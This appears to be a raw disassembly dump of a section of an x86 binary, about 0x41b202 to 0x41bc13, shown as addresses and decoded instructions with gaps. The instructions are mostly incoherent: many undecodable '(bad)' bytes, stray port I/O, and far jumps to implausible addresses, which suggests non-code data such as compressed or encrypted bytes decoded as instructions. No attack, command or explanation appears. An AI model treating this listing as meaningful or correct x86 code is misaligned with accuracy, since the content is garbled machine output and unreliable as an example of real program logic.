  41b202:	xchg   ecx,eax
  41b203:	mov    ds:0x7747e208,al
  41b208:	lods   al,BYTE PTR ds:[esi]
  41b209:	inc    ebp
  41b20a:	dec    ebx
  41b20b:	xor    DWORD PTR [bp-0x45eb],ecx
  41b210:	fs stc 
  41b212:	and    DWORD PTR [esi],edi
  41b214:	jbe    0x41b1a6
  41b216:	inc    eax
  41b217:	stos   BYTE PTR es:[edi],al
  41b218:	or     eax,0xc6063b8e
  41b21d:	push   eax
  41b21e:	bnd jp 0x41b216
  41b221:	mov    dl,0x5e
  41b223:	jle    0x41b259
  41b225:	call   0x6c8524da
  41b22a:	and    dl,dl
  41b22c:	lods   al,BYTE PTR ds:[esi]
  41b22d:	inc    edx
  41b22e:	pop    ss
  41b22f:	mov    edx,0x45b9bafe
  41b234:	sbb    al,0xee
  41b236:	mov    ebp,0x3fd66dc1
  41b23b:	add    bh,0x20
  41b23e:	push   ebx
  41b23f:	or     eax,0x338bfb62
  41b244:	mov    bh,0x28
  41b246:	pop    ecx
  41b247:	mov    ch,0x78
  41b249:	add    al,0xbb
  41b24b:	xchg   esi,eax
  41b24c:	leave  
  41b24d:	fistp  WORD PTR [ebp+0x15]
  41b250:	popa   
  41b251:	add    esp,DWORD PTR [ebp-0x328df2cf]
  41b257:	sti    
  41b258:	in     al,0x67
  41b25a:	gs imul BYTE PTR es:[edi+eax*4+0x48]
  41b260:	into   
  41b261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b262:	dec    edi
  41b263:	int    0x53
  41b265:	rcl    DWORD PTR cs:[ebx+0x2e],0x81
  41b26a:	pop    ebp
  41b26b:	pop    eax
  41b26c:	jmp    0x41b2ab
	...
  41b2d5:	add    BYTE PTR [esi+0x6be069a5],cl
  41b2db:	in     al,dx
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     bh,dl
  41b2e3:	out    dx,eax
  41b2e4:	inc    edx
  41b2e5:	packuswb mm4,QWORD PTR [ecx+eax*1]
  41b2e9:	add    BYTE PTR [eax],al
  41b2eb:	add    DWORD PTR [eax],eax
  41b2ed:	add    dh,al
  41b2ef:	iret   
  41b2f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2f1:	rcr    DWORD PTR [edx-0x5b],0xd9
  41b2f5:	sbb    al,0x3b
  41b2f7:	fbstp  TBYTE PTR [ebx]
  41b2f9:	fcom   DWORD PTR [esi-0x7a80cd70]
  41b2ff:	adc    esi,DWORD PTR [ebx-0x4d44a50d]
  41b305:	inc    edx
  41b306:	dec    ebp
  41b307:	ds xchg ecx,esi
  41b30a:	sub    ecx,esp
  41b30c:	mov    ah,0xb9
  41b30e:	dec    esp
  41b30f:	inc    ecx
  41b310:	(bad)  
  41b312:	adc    al,0xc8
  41b314:	into   
  41b315:	ins    BYTE PTR es:[edi],dx
  41b316:	and    al,BYTE PTR [eax-0x4f]
  41b319:	fild   WORD PTR [eax-0xb]
  41b31c:	les    edx,FWORD PTR ds:[ebx+edi*4+0xec04a9e]
  41b324:	mov    eax,0xd1f8e832
  41b329:	jmp    0xaf198616
  41b32e:	retf   0xcfaf
  41b331:	sbb    eax,0x95456f44
  41b336:	fwait
  41b337:	arpl   dx,bp
  41b339:	dec    esi
  41b33a:	and    ah,BYTE PTR [eax-0x75]
  41b33d:	inc    eax
  41b33e:	xchg   DWORD PTR [esi+0x78],edi
  41b341:	ja     0x41b32b
  41b343:	mov    ebp,0xf481a2a9
  41b348:	stos   BYTE PTR es:[edi],al
  41b349:	mov    ah,0x62
  41b34b:	or     eax,0xd5514173
  41b350:	in     eax,0x66
  41b352:	das    
  41b353:	xchg   ebp,eax
  41b354:	lods   eax,DWORD PTR ds:[esi]
  41b355:	loop   0x41b3d3
  41b357:	imul   esp,DWORD PTR [esi-0x350b0990],0xfb9c29db
  41b361:	je     0x41b384
  41b363:	xor    DWORD PTR [ecx],esp
  41b365:	jne    0x41b361
  41b367:	pop    edx
  41b368:	ss mov ah,0x5a
  41b36b:	std    
  41b36c:	sub    BYTE PTR ds:0x656acd53,cl
  41b372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b373:	sahf   
  41b374:	in     al,dx
  41b375:	push   ecx
  41b376:	mov    eax,ds:0x380aff4e
  41b37b:	push   0xffffffeb
  41b37d:	shr    DWORD PTR [ebx],0x57
  41b380:	mov    ebx,0x8952b3e3
  41b385:	in     eax,dx
  41b386:	cld    
  41b387:	or     dl,bh
  41b389:	das    
  41b38a:	or     bh,0x34
  41b38d:	add    ebp,edi
  41b38f:	or     esi,ebp
  41b391:	mov    eax,0x18536fd5
  41b396:	ds test eax,0x9130112b
  41b39c:	jle    0x41b342
  41b39e:	out    0xec,eax
  41b3a0:	test   BYTE PTR [eax],0x92
  41b3a3:	add    edi,esp
  41b3a5:	inc    edx
  41b3a6:	mov    ah,0x98
  41b3a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3a9:	fcomp  QWORD PTR [edx-0x6260d12e]
  41b3af:	in     eax,dx
  41b3b0:	push   esp
  41b3b1:	jb     0x41b362
  41b3b3:	pop    ebp
  41b3b4:	call   0xb77f:0xfa36e9d0
  41b3bb:	(bad)  
  41b3bc:	in     eax,dx
  41b3bd:	and    BYTE PTR [edi+0x4a7f8553],ch
  41b3c3:	mov    edx,0xc6933fb8
  41b3c8:	inc    ebx
  41b3c9:	dec    edi
  41b3ca:	cmp    eax,0x2b3bf492
  41b3cf:	add    ebx,DWORD PTR [edx-0x7952099e]
  41b3d5:	lock ret 
  41b3d7:	push   ds
  41b3d8:	mov    esp,DWORD PTR ds:0xcb28078b
  41b3de:	pop    edi
  41b3df:	xor    edx,DWORD PTR [eax+0x31]
  41b3e2:	ret    0xf828
  41b3e5:	push   0x6f42abf1
  41b3ea:	test   al,0x26
  41b3ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ed:	lods   al,BYTE PTR ds:[esi]
	...
  41b456:	dec    eax
  41b457:	or     eax,0xbb5dab1d
  41b45c:	(bad)  
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	repnz rol BYTE PTR ds:0x1256741,0x0
  41b46a:	add    BYTE PTR [ecx],al
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	xchg   esp,eax
  41b46f:	sbb    ecx,DWORD PTR [ebx]
  41b471:	cmp    al,0x1b
  41b473:	xchg   edx,eax
  41b474:	retf   0xff6f
  41b477:	clc    
  41b478:	lahf   
  41b479:	jno    0x41b4f8
  41b47b:	cmp    eax,0x405a49d1
  41b480:	lods   eax,DWORD PTR ds:[esi]
  41b481:	push   ecx
  41b482:	imul   ecx,DWORD PTR [esi],0xffffffae
  41b485:	or     al,0xa9
  41b487:	retf   0x33ea
  41b48a:	jmp    0xa14b2f5d
  41b48f:	mov    ch,0x1d
  41b491:	push   ebx
  41b492:	and    ebp,DWORD PTR [eax+ebx*2-0x71]
  41b496:	popa   
  41b497:	es dec ebx
  41b499:	mov    bh,0x7a
  41b49b:	dec    esi
  41b49c:	xchg   ebx,eax
  41b49d:	ret    0x78d7
  41b4a0:	int    0xef
  41b4a2:	xchg   ebp,eax
  41b4a3:	cmp    al,0xfb
  41b4a5:	add    eax,ecx
  41b4a7:	and    eax,0xf1df735e
  41b4ac:	xchg   edi,eax
  41b4ad:	mov    eax,0x4a38d066
  41b4b2:	stos   DWORD PTR es:[edi],eax
  41b4b3:	xor    cl,BYTE PTR [eax]
  41b4b5:	sbb    al,0xd1
  41b4b7:	jmp    0x61feb2a0
  41b4bc:	cmp    DWORD PTR [ebx+0xa9663d9],esp
  41b4c2:	pop    ebx
  41b4c3:	repnz pushw ss
  41b4c6:	and    al,bl
  41b4c8:	mov    ds:0xb20d5876,eax
  41b4cd:	mov    ebx,0x39f53181
  41b4d2:	js     0x41b54a
  41b4d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4d5:	dec    edx
  41b4d6:	xchg   edi,eax
  41b4d7:	jecxz  0x41b4e3
  41b4d9:	inc    ebp
  41b4da:	mov    edi,0x8a1c69de
  41b4df:	jmp    0x41b4fb
  41b4e1:	jle    0x41b467
  41b4e3:	lea    ebp,[ebx-0x79]
  41b4e6:	jmp    0xe31e:0xc8a0b4ad
  41b4ed:	(bad)  
  41b4ee:	mov    ch,0xe9
  41b4f0:	shl    BYTE PTR [ecx+0x1],0xbe
  41b4f4:	sbb    BYTE PTR [ecx],ah
  41b4f6:	push   ebx
  41b4f7:	daa    
  41b4f8:	lods   eax,DWORD PTR ds:[esi]
  41b4f9:	add    ebx,ecx
  41b4fb:	sub    BYTE PTR [edi+0x4586d19c],dh
  41b501:	leave  
  41b502:	ror    DWORD PTR [ecx-0x61d93ed8],1
  41b508:	retf   0x888a
  41b50b:	and    cl,BYTE PTR [edi]
  41b50d:	add    DWORD PTR [edx+0x55761434],ecx
  41b513:	xor    dh,BYTE PTR [ebx-0x1]
  41b516:	aaa    
  41b517:	outs   dx,BYTE PTR ds:[esi]
  41b518:	push   cs
  41b519:	shl    edi,0x7d
  41b51c:	sub    esi,ecx
  41b51e:	mul    DWORD PTR [edx-0x4e]
  41b521:	stos   DWORD PTR es:[edi],eax
  41b522:	das    
  41b523:	shl    DWORD PTR [ebx-0x6c],cl
  41b526:	(bad)  
  41b527:	add    edi,DWORD PTR fs:[ebx+ebx*4-0x396da67]
  41b52f:	arpl   WORD PTR [esi+0x4],bp
  41b532:	stc    
  41b533:	add    eax,DWORD PTR [eax]
  41b535:	fstp   st(7)
  41b537:	je     0x41b571
  41b539:	jmp    0xb4cf:0x38c5149
  41b540:	lea    ebp,[ebx-0x43df421e]
  41b546:	stos   DWORD PTR es:[edi],eax
  41b547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b548:	aam    0x34
  41b54a:	add    DWORD PTR [eax+edi*2+0x4f022293],0xe01a725a
  41b555:	retf   0xb5f8
  41b558:	in     al,dx
  41b559:	adc    DWORD PTR [ebx],esi
  41b55b:	(bad)  
  41b55c:	sbb    esi,ebp
  41b55e:	(bad)  
  41b55f:	shr    ah,0xc0
  41b562:	lods   al,BYTE PTR ds:[esi]
  41b563:	xchg   esi,eax
  41b564:	pop    edx
  41b565:	push   edx
  41b566:	aam    0x5c
  41b568:	sahf   
  41b569:	xchg   esi,eax
  41b56a:	mov    dh,0x93
  41b56c:	dec    edx
  41b56d:	ins    DWORD PTR es:[edi],dx
	...
  41b5d6:	aam    0xec
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	jb     0x41b568
  41b5e4:	mov    al,ds:0x1266732
  41b5e9:	add    BYTE PTR [eax],al
  41b5eb:	add    DWORD PTR [eax],eax
  41b5ed:	add    bh,dh
  41b5ef:	cwde   
  41b5f0:	sbb    esi,esi
  41b5f2:	cs mov ebp,0x7588c8fb
  41b5f8:	adc    eax,0xab49dfff
  41b5fd:	imul   eax,DWORD PTR [ebp+0x31],0x0
  41b601:	push   esi
  41b602:	mov    ah,0xc
  41b604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b605:	ss sub eax,0x52965179
  41b60b:	sbb    eax,0xa867c76a
  41b610:	fld    QWORD PTR [edx+ebp*2-0x13]
  41b614:	mov    BYTE PTR [edx],al
  41b616:	test   DWORD PTR [esi-0x52d94d75],edx
  41b61c:	xor    ebp,DWORD PTR [eax-0x73]
  41b61f:	imul   esi,DWORD PTR [ecx],0x9e51597d
  41b625:	inc    esi
  41b626:	lds    edx,FWORD PTR [ebx-0x6106b7eb]
  41b62c:	aad    0x3b
  41b62e:	pushf  
  41b62f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b630:	shr    BYTE PTR [esi+0x2ac41066],cl
  41b636:	jge    0x41b619
  41b638:	outs   dx,DWORD PTR ds:[esi]
  41b639:	js     0x41b65e
  41b63b:	cld    
  41b63c:	sbb    al,0xb7
  41b63e:	mov    esp,0x8c16bef
  41b643:	imul   BYTE PTR [edx]
  41b645:	inc    ebx
  41b646:	stos   DWORD PTR es:[edi],eax
  41b647:	inc    eax
  41b648:	sti    
  41b649:	call   0x85484688
  41b64e:	push   edi
  41b64f:	les    esi,FWORD PTR ds:0x19a0047
  41b655:	xchg   edx,eax
  41b656:	into   
  41b657:	icebp  
  41b658:	test   edx,eax
  41b65a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b65b:	sbb    eax,0x1b7b52ea
  41b660:	sub    dl,BYTE PTR [ecx]
  41b662:	or     al,0xbb
  41b664:	xchg   ecx,eax
  41b665:	or     eax,0x542f3098
  41b66a:	inc    edi
  41b66b:	in     al,0x5
  41b66d:	aaa    
  41b66e:	mov    eax,0xa780b1ed
  41b673:	xor    BYTE PTR [eax],bh
  41b675:	ret    0xcdf3
  41b678:	cmc    
  41b679:	hlt    
  41b67a:	push   edx
  41b67b:	pop    ecx
  41b67c:	jmp    0x41b65d
  41b67e:	push   eax
  41b67f:	xchg   edx,eax
  41b680:	(bad)  
  41b681:	mov    ecx,0x95fe2ef8
  41b686:	out    0x3b,eax
  41b688:	mov    WORD PTR [ecx+ebx*8-0x50],gs
  41b68c:	fs loope 0x41b624
  41b68f:	fs sbb esp,0x70
  41b693:	repz mov al,ds:0xe9535b52
  41b699:	and    bl,BYTE PTR [ecx-0x1e]
  41b69c:	bound  edi,QWORD PTR [eax-0xa]
  41b69f:	and    al,0x9e
  41b6a1:	jns    0x41b65b
  41b6a3:	xchg   edx,eax
  41b6a4:	xchg   esp,eax
  41b6a5:	hlt    
  41b6a6:	mov    bl,0xbf
  41b6a8:	test   eax,0x57fab909
  41b6ad:	xor    ecx,ecx
  41b6af:	mov    eax,0xf0604ad9
  41b6b4:	cmp    BYTE PTR [ecx],dh
  41b6b6:	cmp    BYTE PTR [ecx+eiz*1+0x49],0x1c
  41b6bb:	or     dh,BYTE PTR ds:0x3a8d5038
  41b6c1:	sar    BYTE PTR [ebp+0x7d2b642],cl
  41b6c7:	mov    esi,0x10ea5b9
  41b6cc:	mov    ecx,0xe511cbe8
  41b6d1:	or     ah,ch
  41b6d3:	cmp    al,0xc4
  41b6d5:	into   
  41b6d6:	lea    eax,[ecx]
  41b6d8:	add    al,0x8b
  41b6da:	inc    ebp
  41b6db:	mov    ah,0xcf
  41b6dd:	sub    DWORD PTR [edx],ebx
  41b6df:	lods   al,BYTE PTR ds:[esi]
  41b6e0:	mov    WORD PTR [edx],fs
  41b6e2:	or     DWORD PTR [eax],edi
  41b6e4:	mov    ?,WORD PTR [esi+eax*8-0x45]
  41b6e8:	adc    esi,edx
  41b6ea:	xor    al,0xc6
  41b6ec:	cli    
  41b6ed:	jge    0x41b6ef
	...
  41b753:	add    BYTE PTR [eax],al
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	(bad)  
  41b763:	enter  0x5623,0x67
  41b767:	daa    
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	lock mov ah,0x35
  41b771:	es aad 0xd8
  41b774:	dec    edx
  41b775:	xlat   BYTE PTR ds:[ebx]
  41b776:	xchg   DWORD PTR [ebx-0x4cf25b6a],ecx
  41b77c:	clc    
  41b77d:	aas    
  41b77e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b77f:	mov    ah,BYTE PTR [ebx+eax*1+0x12]
  41b783:	icebp  
  41b784:	(bad)  
  41b785:	and    eax,0xcd55d771
  41b78a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b78b:	cmp    al,BYTE PTR [edx-0x1b978f12]
  41b791:	mov    cl,0x80
  41b793:	mov    al,0x32
  41b795:	sub    al,0x71
  41b797:	push   0xfffffffd
  41b799:	jne    0x41b7ac
  41b79b:	(bad)  
  41b79c:	into   
  41b79d:	mov    ds:0x3e9e7dea,al
  41b7a2:	adc    al,0x1d
  41b7a5:	out    0x85,eax
  41b7a7:	cdq    
  41b7a8:	adc    bh,BYTE PTR [eax]
  41b7aa:	std    
  41b7ab:	fldenv fs:[edi]
  41b7ae:	mov    ah,0x8d
  41b7b0:	mov    ebx,DWORD PTR [esi-0x7e]
  41b7b3:	or     DWORD PTR [eax],0x386d6e29
  41b7b9:	(bad)  
  41b7ba:	push   esi
  41b7bb:	jne    0x41b82b
  41b7bd:	ret    
  41b7be:	arpl   di,cx
  41b7c0:	in     al,0x2c
  41b7c2:	sbb    eax,0xc8a6f408
  41b7c7:	inc    eax
  41b7c8:	sbb    DWORD PTR [ebp+0x7d7112f1],ebx
  41b7ce:	imul   ebp,DWORD PTR [edx+0x53],0xffffffbf
  41b7d2:	lds    esp,FWORD PTR [ebx-0x75]
  41b7d5:	lods   al,BYTE PTR ds:[esi]
  41b7d6:	jb     0x41b7b8
  41b7d8:	inc    esp
  41b7d9:	inc    eax
  41b7da:	inc    ebp
  41b7db:	fldenv ds:0x5daf998c
  41b7e1:	sbb    BYTE PTR ds:0x412418e5,cl
  41b7e7:	mov    dh,0x2c
  41b7e9:	mov    edi,0x2bb0ada5
  41b7ee:	and    ah,al
  41b7f0:	stos   DWORD PTR es:[edi],eax
  41b7f1:	or     bh,ch
  41b7f3:	jmp    0x8246d3b
  41b7f8:	sub    ah,BYTE PTR [esi]
  41b7fa:	je     0x41b868
  41b7fc:	imul   ecx,ecx,0x1
  41b7ff:	js     0x41b83a
  41b801:	ret    0x2154
  41b804:	pop    es
  41b805:	mov    ah,0x30
  41b807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b808:	jecxz  0x41b817
  41b80a:	out    dx,eax
  41b80b:	outs   dx,DWORD PTR ds:[esi]
  41b80c:	cmc    
  41b80d:	push   ds
  41b80e:	push   ecx
  41b80f:	ins    BYTE PTR es:[edi],dx
  41b810:	int    0x5d
  41b812:	jns    0x41b85e
  41b814:	stos   BYTE PTR es:[edi],al
  41b815:	ins    DWORD PTR es:[edi],dx
  41b816:	cmp    eax,0x708a9f47
  41b81b:	cmp    ch,BYTE PTR [edi+0x3f]
  41b81e:	jo     0x41b859
  41b820:	in     al,dx
  41b821:	shr    BYTE PTR ds:0xeb721256,0x73
  41b828:	fcom   DWORD PTR [esi+0x47fd1905]
  41b82e:	and    cl,cl
  41b830:	rcr    BYTE PTR [ebx],0xc9
  41b833:	and    al,0xed
  41b835:	in     al,0x99
  41b837:	cdq    
  41b838:	xchg   BYTE PTR [edx-0x23],dh
  41b83b:	jo     0x41b7dd
  41b83d:	and    BYTE PTR [edi+0x34],cl
  41b840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b841:	sbb    al,0xa5
  41b843:	jge    0x41b86e
  41b845:	sar    DWORD PTR [ebx+0x74f9037a],0x86
  41b84c:	sub    ebx,ebx
  41b84e:	xor    BYTE PTR [ebx+ecx*8+0x4c564ead],dl
  41b855:	inc    ebp
  41b856:	jae    0x41b8a8
  41b858:	push   edi
  41b859:	sti    
  41b85a:	push   ebp
  41b85b:	sti    
  41b85c:	sub    DWORD PTR [eax],esp
  41b85e:	cmp    dl,BYTE PTR [ebx-0x719fada6]
  41b864:	icebp  
  41b865:	adc    esp,DWORD PTR [ebp+edi*1-0x6074aa42]
  41b86c:	hlt    
  41b86d:	call   0x0:0x0
	...
  41b8d4:	add    BYTE PTR [eax],al
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x9b
  41b8e3:	mov    BYTE PTR [ecx+0x128677b],ah
  41b8e9:	add    BYTE PTR [eax],al
  41b8eb:	add    DWORD PTR [eax],eax
  41b8ed:	add    BYTE PTR [eax+edx*1],bl
  41b8f0:	retf   
  41b8f1:	jns    0x41b8e1
  41b8f3:	sahf   
  41b8f4:	stos   DWORD PTR es:[edi],eax
  41b8f5:	sbb    dh,BYTE PTR [edi-0x38]
  41b8f8:	mov    esp,0x49a3c058
  41b8fd:	pop    esi
  41b8fe:	jno    0x41b91c
  41b900:	fld    QWORD PTR [edx-0x48f9494c]
  41b906:	daa    
  41b907:	dec    ecx
  41b908:	shr    DWORD PTR [edx-0x6c],1
  41b90b:	fwait
  41b90c:	mov    ebp,0x7bbe3265
  41b911:	cdq    
  41b912:	add    BYTE PTR [eax],bl
  41b914:	push   esp
  41b915:	loopne 0x41b969
  41b917:	adc    ah,BYTE PTR [ebp-0x2da42bd4]
  41b91d:	sub    DWORD PTR [ecx],esp
  41b91f:	loopne 0x41b983
  41b921:	scas   eax,DWORD PTR es:[edi]
  41b922:	cmp    BYTE PTR [ebx+0x4db9f149],0x9b
  41b929:	mul    dl
  41b92b:	lea    ebp,[esi]
  41b92d:	sbb    DWORD PTR [ebx],0xffffffbb
  41b930:	ins    DWORD PTR es:[edi],dx
  41b931:	dec    ebx
  41b932:	pop    es
  41b933:	or     eax,0xbf63937e
  41b938:	not    DWORD PTR [eax]
  41b93a:	inc    ebp
  41b93b:	fisttp WORD PTR [ebp+eax*4+0x40]
  41b93f:	(bad)  
  41b940:	lods   al,BYTE PTR ds:[esi]
  41b941:	arpl   WORD PTR [esi+edi*1+0x9537004],dx
  41b948:	push   ds
  41b949:	cwde   
  41b94a:	push   cs
  41b94b:	iret   
  41b94c:	sahf   
  41b94d:	fadd   QWORD PTR [ebx]
  41b94f:	jno    0x41b8e1
  41b951:	ja     0x41b99d
  41b953:	rol    DWORD PTR [ecx],cl
  41b955:	add    ch,al
  41b957:	pop    esp
  41b958:	push   edx
  41b959:	mov    cl,0x6e
  41b95b:	(bad)  
  41b95c:	pop    edx
  41b95d:	inc    edi
  41b95e:	xor    eax,0xf9937d1e
  41b963:	arpl   WORD PTR [esi+ebp*2+0x352125a2],cx
  41b96a:	sub    al,0xd8
  41b96c:	mov    ecx,0xdde4254a
  41b971:	and    DWORD PTR [eax-0x5a],ecx
  41b974:	inc    edi
  41b975:	jnp    0x41b943
  41b977:	lods   eax,DWORD PTR ds:[esi]
  41b978:	div    edi
  41b97a:	enter  0xe0f5,0xb3
  41b97e:	inc    ebp
  41b97f:	add    DWORD PTR [eax],ebp
  41b981:	sti    
  41b982:	push   edx
  41b983:	xchg   edi,eax
  41b984:	mov    ds:0x293f16d8,eax
  41b989:	adc    ah,BYTE PTR [ebx-0x76]
  41b98c:	jo     0x41b9eb
  41b98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b98f:	(bad)  
  41b990:	xor    al,0x4e
  41b992:	cmp    eax,0x9faede86
  41b997:	push   eax
  41b998:	dec    eax
  41b999:	out    0xc6,eax
  41b99b:	iret   
  41b99c:	inc    edx
  41b99d:	xor    BYTE PTR [edx*1-0x49683db1],al
  41b9a4:	inc    BYTE PTR [ebx+0x9cb87fa]
  41b9aa:	sbb    edi,DWORD PTR [ebx-0x6d]
  41b9ad:	add    eax,0xecc35139
  41b9b2:	pop    ss
  41b9b3:	or     edi,DWORD PTR [ebx+0x4ba33445]
  41b9b9:	mov    ebp,0xfab5ed10
  41b9be:	(bad)  
  41b9bf:	jns    0x41b9f9
  41b9c1:	lds    eax,FWORD PTR [edx+0x752602e4]
  41b9c7:	test   eax,0xcb0330f2
  41b9cc:	inc    esp
  41b9cd:	mov    BYTE PTR [esi+0x27c98c14],0x16
  41b9d4:	(bad)  
  41b9d5:	cmp    ecx,DWORD PTR [ecx+0x54]
  41b9d8:	sbb    eax,0x9c485b95
  41b9dd:	sub    edi,DWORD PTR [eax-0x970e4f9]
  41b9e3:	mov    ah,0xa4
  41b9e5:	push   ecx
  41b9e6:	je     0x41b9de
  41b9e8:	jb     0x41b9eb
  41b9ea:	sbb    edi,DWORD PTR [esi+0x96cc]
	...
  41ba54:	add    BYTE PTR [eax],al
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	fisubr DWORD PTR [esi+0x296764c9]
  41ba68:	add    DWORD PTR [eax],eax
  41ba6a:	add    BYTE PTR [ecx],al
  41ba6c:	add    BYTE PTR [eax],al
  41ba6e:	or     DWORD PTR [edi],edi
  41ba70:	dec    ebx
  41ba71:	js     0x41ba88
  41ba73:	mov    esp,0x80d45083
  41ba78:	lods   al,BYTE PTR cs:[esi]
  41ba7a:	mov    al,0x76
  41ba7c:	pushf  
  41ba7d:	sar    ah,1
  41ba7f:	adc    dh,ch
  41ba81:	out    0x29,al
  41ba83:	into   
  41ba84:	(bad)  
  41ba85:	cmc    
  41ba86:	push   ds
  41ba87:	or     eax,0xa1a3c5dd
  41ba8c:	xor    dh,BYTE PTR [edx-0x61]
  41ba8f:	pop    esp
  41ba90:	mov    DWORD PTR [edx-0x37017973],edi
  41ba96:	cmp    DWORD PTR [esi+0x6a9b1253],esp
  41ba9c:	xchg   esp,eax
  41ba9d:	loopne 0x41bae2
  41ba9f:	fwait
  41baa0:	rol    DWORD PTR [eax+0x62e3a8a1],cl
  41baa6:	push   ds
  41baa7:	lods   eax,DWORD PTR ds:[esi]
  41baa8:	int    0xb0
  41baaa:	aas    
  41baab:	cmp    al,0xf4
  41baad:	mov    al,0x4c
  41baaf:	xchg   DWORD PTR [edx+ecx*1],ebp
  41bab2:	add    al,0xda
  41bab4:	cs test al,0xe0
  41bab7:	xchg   BYTE PTR [edx],al
  41bab9:	repz jmp 0xbbeefb6d
  41babf:	push   esi
  41bac0:	or     al,0x16
  41bac2:	sar    BYTE PTR [esi],cl
  41bac4:	sbb    BYTE PTR [ebp-0x71],ch
  41bac7:	adc    cl,BYTE PTR [ebp-0x25]
  41baca:	sub    DWORD PTR [edi],edi
  41bacc:	pop    esi
  41bacd:	jbe    0x41bb2d
  41bacf:	jnp    0x41ba9b
  41bad1:	pop    ecx
  41bad2:	push   0x53
  41bad4:	adc    BYTE PTR [ebp+0x6916afc9],bl
  41bada:	xchg   esp,eax
  41badb:	in     eax,0x99
  41badd:	cdq    
  41bade:	jmp    0x41badd
  41bae0:	dec    ecx
  41bae1:	or     bl,BYTE PTR [edx-0x666f67a]
  41bae7:	jb     0x41baec
  41bae9:	popa   
  41baea:	xchg   esi,eax
  41baeb:	adc    al,0xe8
  41baed:	div    edi
  41baef:	xchg   eax,esp
  41baf1:	mov    bh,0x49
  41baf3:	test   BYTE PTR [edx+0x593a3e1b],ah
  41baf9:	test   DWORD PTR [ebx],edi
  41bafb:	(bad)  
  41bafc:	mov    eax,ds:0xc9b07ef7
  41bb01:	pop    ss
  41bb02:	lds    edi,FWORD PTR [edi]
  41bb04:	pop    ss
  41bb05:	ins    DWORD PTR es:[edi],dx
  41bb06:	xchg   ebp,eax
  41bb07:	inc    esp
  41bb08:	mov    ecx,0x24f6c9e9
  41bb0d:	xor    DWORD PTR [ecx+0x7503aaa],esp
  41bb13:	mov    ch,0x4d
  41bb15:	dec    esp
  41bb16:	lock ss dec eax
  41bb19:	imul   BYTE PTR [ebp-0x1c9f3338]
  41bb1f:	or     ecx,DWORD PTR [ebp+0x21]
  41bb22:	ja     0x41bae5
  41bb24:	jmp    0x41bb26
  41bb26:	sub    DWORD PTR [eax+0x4a9bdbb8],esp
  41bb2c:	mov    edi,esp
  41bb2e:	outs   dx,DWORD PTR ds:[esi]
  41bb2f:	inc    esi
  41bb30:	adc    ch,BYTE PTR [edx]
  41bb32:	jnp    0x41bb2f
  41bb34:	pop    edx
  41bb35:	jns    0x41bac9
  41bb37:	call   0xf888:0xba05d84f
  41bb3e:	aas    
  41bb3f:	or     al,0x50
  41bb41:	jmp    0x7f78:0xb05971e1
  41bb48:	call   0xa1cd:0x31ed0127
  41bb4f:	push   es
  41bb50:	retf   
  41bb51:	jg     0x41bad9
  41bb53:	dec    ebp
  41bb54:	repnz cmps WORD PTR ds:[esi],WORD PTR es:[edi]
  41bb57:	outs   dx,DWORD PTR ds:[esi]
  41bb58:	or     BYTE PTR [edi-0x3a],0x4a
  41bb5c:	jge    0x41bb88
  41bb5e:	push   ds
  41bb5f:	push   esp
  41bb60:	hlt    
  41bb61:	shr    BYTE PTR [esi+0xb5d07b3],1
  41bb67:	cmp    ch,BYTE PTR [edi]
  41bb69:	les    edx,FWORD PTR [ebx-0x5a]
  41bb6c:	pop    ecx
  41bb6d:	sbb    eax,0x0
	...
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0x5a],cx
  41bbe3:	test   eax,0x2a674c20
  41bbe8:	add    DWORD PTR [eax],eax
  41bbea:	add    BYTE PTR [ecx],al
  41bbec:	add    BYTE PTR [eax],al
  41bbee:	mov    esp,0x2733b336
  41bbf3:	mov    esp,fs
  41bbf5:	jmp    0x62a46b3c
  41bbfa:	mov    edi,0xfa0ed28f
  41bbff:	pop    ds
  41bc00:	pop    es
  41bc01:	aam    0x74
  41bc03:	push   es
  41bc04:	cmp    DWORD PTR [ebx+ecx*2],esp
  41bc07:	jge    0x41bbde
  41bc09:	push   cs
  41bc0a:	sub    al,0x48
  41bc0c:	out    0x20,eax
  41bc0e:	(bad)  
  41bc0f:	(bad)  
  41bc10:	aad    0xfc
  41bc12:	lahf   
  41bc13:	std    
